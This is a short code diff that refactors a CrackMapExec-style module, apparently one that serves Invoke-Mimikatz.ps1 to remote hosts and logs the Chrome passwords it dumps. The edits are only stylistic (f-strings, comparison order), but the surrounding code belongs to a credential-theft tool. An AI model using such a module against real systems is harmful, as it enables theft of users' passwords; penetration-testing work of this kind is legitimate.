@@ -71,7 +71,7 @@ class CMEModule:
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
-        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-Mimikatz.ps1':
             request.send_response(200)
             request.end_headers()
 
@@ -117,6 +117,7 @@ class CMEModule:
                         context.log.highlight('Password: ' + cred['passw'])
                         context.log.highlight('')
 
-            log_name = 'EnumChrome-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            log_name = f'EnumChrome-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.log'
+
             write_log(data, log_name)
-            context.log.info("Saved Mimikatz's output to {}".format(log_name))
+            context.log.info(f"Saved Mimikatz's output to {log_name}")
